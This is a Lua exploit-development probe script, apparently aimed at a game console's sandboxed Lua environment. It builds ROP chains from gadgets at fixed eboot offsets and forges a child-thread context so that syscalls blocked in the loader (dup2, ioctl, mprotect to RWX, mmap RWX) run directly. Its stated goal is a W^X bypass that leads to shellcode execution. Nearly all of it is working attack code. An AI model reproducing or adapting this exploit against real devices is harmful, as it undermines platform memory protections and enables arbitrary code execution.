-- CRASH_CLASS: HIGH
-- PROBE 104a: test previously-blocked syscalls from child thread
--
-- Several syscalls return -1 from make_syscall(): dup2, ioctl, mprotect(EXEC).
-- Child threads execute via SA directly, bypassing Lua loader.
-- If the block is in the loader (not kernel), child threads bypass it.
--
-- THE BIG TEST: mprotect(PROT_EXEC) from child thread.
-- If this works → W^X bypass → shellcode execution.
--
-- Uses mov [rdi],rax;ret gadget at eboot+0x92C67 (confirmed in 91h)
-- to write syscall return values to shared memory.

print("=== PROBE 104a: CHILD THREAD BLOCKED SYSCALLS ===")
print("")
collectgarbage("stop")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function z(b,n) for o=0,n-4,4 do wd(b+o,0) end end
local function hx(v) if v==nil then return "nil" end return string.format("0x%X",v) end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO syscall_address") return end
local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

-- Eboot base
local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end

-- Known gadgets
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRSI=uint64(string.format("0x%X%08X",ehi,elo+0xD77D))
local WMOV=uint64(string.format("0x%X%08X",ehi,elo+0x92C67))  -- mov [rdi],rax;ret

local _DI=0x048; local _SI=0x050; local _DX=0x058
local _R10=0x060; local _R8=0x068; local _R9=0x070; local _AX=0x078
local _CS=0x0C0; local _FL=0x0D0; local _IP=0x0E0
local _SP=0x0F8; local _SS=0x100; local _MG=0x108; local _TP=0x110

local mm=mk(477); local tc=mk(430)

-- Allocate region: 4 shared pages + 1 child slot
local ok_m,region=pcall(function()
    return mm(uint64(0),uint64(7*0x4000),uint64(3),
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
if not ok_m then print("MMAP FAIL") return end
local R=N(region)

local ts999=R; wq(ts999,uint64(999)); wq(ts999+8,uint64(0))
local sl200=R+0x40; wq(sl200,uint64(0)); wq(sl200+8,uint64(200000000))
local tb=R+0x80
local RESULT=R+0x1000  -- child writes return value here
local child_stk=R+0x4000*4
local child_ctx=R+0x4000*6

print(string.format("region=0x%X WMOV=eboot+0x92C67", R))

local function setup(rax, rdi, rsi, rdx, r10, r8, r9)
    z(child_ctx,0x200)
    wq(child_ctx+_MG,uint64(0x480)); wd(child_ctx+_FL,0)
    wq(child_ctx+_TP,uint64(0x10000))
    wq(child_ctx+_CS,uint64(0x43)); wq(child_ctx+_SS,uint64(0x3B))
    wq(child_ctx+_IP,SA); wq(child_ctx+_SP,uint64(child_stk))
    wq(child_ctx+_AX,uint64(rax))
    wq(child_ctx+_DI,uint64(rdi))
    wq(child_ctx+_SI,uint64(rsi))
    wq(child_ctx+_DX,uint64(rdx or 0))
    wq(child_ctx+_R10,uint64(r10 or 0))
    wq(child_ctx+_R8,uint64(r8 or 0))
    if r9 then wq(child_ctx+_R9,uint64(r9)) end
end

local function run_child_sc(label, sysno, a1, a2, a3, a4, a5, a6)
    -- Sentinel
    wq(RESULT, uint64(0xDEADCAFE))
    wq(RESULT+8, uint64(0xDEADCAFE))

    -- Stack chain: after syscall, RAX = return value
    -- pop rdi; ret → RESULT addr
    -- mov [rdi], rax; ret → store result
    -- nanosleep(999s) → keep child alive
    local stk=child_stk; local off=0
    local function push(v) wq(stk+off, v); off=off+8 end

    push(PRDI); push(uint64(RESULT))
    push(WMOV)  -- stores RAX to RESULT
    push(PRDI); push(uint64(ts999))
    push(PRSI); push(uint64(0))
    push(PRAX); push(uint64(240))
    push(SA)  -- nanosleep

    setup(sysno, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
    wq(tb,uint64(0))
    pcall(function() tc(uint64(child_ctx), uint64(tb), uint64(0)) end)

    -- Wait for child
    native.fcall_with_rax(stub,240,N(sl200),0)

    -- Read result
    local rv_lo=rd(RESULT) or 0
    local rv_hi=rd(RESULT+4) or 0
    local sentinel=0xDEADCAFE
    local wrote=(rv_lo~=sentinel or rv_hi~=0)

    local c=N(native.fcall_with_rax(stub,20))
    local alive=(c==pid)

    if not alive then
        print(string.format("  %s: PROCESS KILLED (canary=%d)", label, c))
        return nil, false
    end

    if wrote then
        if rv_hi==0xFFFFFFFF then
            -- Negative value: -1
            print(string.format("  %s: rv=-1 (0x%X%08X)", label, rv_hi, rv_lo))
            return -1, true
        else
            print(string.format("  %s: rv=0x%X%08X (%d)", label, rv_hi, rv_lo, rv_lo))
            return rv_lo, true
        end
    else
        print(string.format("  %s: SENTINEL unchanged (child didn't write)", label))
        return nil, true
    end
end

local function main_sc(label, sysno, a1, a2, a3, a4, a5, a6)
    local sc=mk(sysno)
    local ok,rv=pcall(function()
        return sc(uint64(a1 or 0),uint64(a2 or 0),uint64(a3 or 0),
            uint64(a4 or 0),uint64(a5 or 0),uint64(a6 or 0))
    end)
    if ok then
        local v=N(rv)
        print(string.format("  %s (main): rv=%d", label, v))
        return v
    else
        print(string.format("  %s (main): PCALL FAIL", label))
        return -999
    end
end

-- Create test socket
local sc_socket=mk(97)
local ok_s,fd=pcall(function() return sc_socket(uint64(2),uint64(2),uint64(0)) end)
local test_fd=ok_s and N(fd) or -1
print(string.format("test fd=%d", test_fd))

-- ============================================================
print("")
print("--- A: dup2(fd, 100) [sys 33] ---")
main_sc("dup2", 33, test_fd, 100)
local rv_a, ok_a = run_child_sc("dup2_child", 33, test_fd, 100)
if rv_a and rv_a>=0 then
    print("  ** DUP2 WORKS FROM CHILD! **")
    -- Close duped fd
    pcall(function() mk(6)(uint64(100)) end)
end

-- ============================================================
print("")
print("--- B: fcntl(fd, F_GETFL) [sys 92] ---")
main_sc("fcntl_GETFL", 92, test_fd, 3)
run_child_sc("fcntl_child", 92, test_fd, 3)

-- ============================================================
print("")
print("--- C: ioctl(fd, FIONREAD) [sys 54] ---")
local ioctl_buf=memory.alloc(8); wd(ioctl_buf,0)
main_sc("ioctl", 54, test_fd, 0x4004667F, N(ioctl_buf))
run_child_sc("ioctl_child", 54, test_fd, 0x4004667F, N(ioctl_buf))

-- ============================================================
print("")
print("--- D: pipe() [sys 42] ---")
main_sc("pipe", 42)
run_child_sc("pipe_child", 42)

-- ============================================================
print("")
print("--- E: mprotect RW→RWX [sys 74] — THE BIG ONE ---")
-- Allocate a fresh RW page
local ok_mp,test_page=pcall(function()
    return mm(uint64(0),uint64(0x4000),uint64(3),  -- PROT_READ|PROT_WRITE
        uint64(0x1002),uint64(0xFFFFFFFF),uint64(0))
end)
local tp=ok_mp and N(test_page) or 0
print(string.format("  test page=0x%X", tp))

if tp>0 then
    -- Write test shellcode: nop nop nop ret
    wd(tp, 0x90909090)
    wd(tp+4, 0xC3909090)

    -- Main thread: mprotect RWX (expect -1)
    main_sc("mprotect_RWX", 74, tp, 0x4000, 7)
    -- Main thread: mprotect RX (expect -1)
    main_sc("mprotect_RX", 74, tp, 0x4000, 5)

    -- Child: mprotect RWX
    local rv_e1, ok_e1 = run_child_sc("mprotect_RWX_child", 74, tp, 0x4000, 7)
    if rv_e1 and rv_e1==0 then
        print("  *** MPROTECT RWX SUCCEEDED FROM CHILD! W^X BYPASSED! ***")
    end

    -- Child: mprotect RX
    local rv_e2, ok_e2 = run_child_sc("mprotect_RX_child", 74, tp, 0x4000, 5)
    if rv_e2 and rv_e2==0 then
        print("  *** MPROTECT RX SUCCEEDED FROM CHILD! W^X BYPASSED! ***")
    end
end

-- ============================================================
print("")
print("--- F: mmap RWX [sys 477] ---")
-- mmap with PROT_RWX=7
main_sc("mmap_RWX", 477, 0, 0x4000, 7, 0x1002, 0xFFFFFFFF, 0)
run_child_sc("mmap_RWX_child", 477, 0, 0x4000, 7, 0x1002, 0xFFFFFFFF, 0)

-- ============================================================
print("")
print("--- G: mtypeprotect [sys 548] alternate EXEC ---")
-- sys 548 batch VM ops: op=2 is protection update
-- Try to set EXEC permission via this alternate path
local vm_buf=memory.alloc(0x40); z(vm_buf,0x40)
if tp>0 then
    -- op=2 (protection update), addr, size, new_prot=7
    wq(vm_buf, uint64(2))       -- operation code
    wq(vm_buf+8, uint64(tp))    -- address
    wq(vm_buf+16, uint64(0x4000))  -- size
    wq(vm_buf+24, uint64(7))    -- new protection (RWX)
    main_sc("sys548_RWX", 548, N(vm_buf), 1, 0x40)
    run_child_sc("sys548_RWX_child", 548, N(vm_buf), 1, 0x40)
end

-- ============================================================
print("")
print("--- H: getuid/getgid [sys 24/47] — identity check ---")
main_sc("getuid", 24)
run_child_sc("getuid_child", 24)
main_sc("getgid", 47)
run_child_sc("getgid_child", 47)

-- ============================================================
print("")
local fc=N(native.fcall_with_rax(stub,20))
print(string.format("FINAL: canary=%s", fc==pid and "OK" or "!!FAIL="..fc))
print("=== 104a COMPLETE ===")
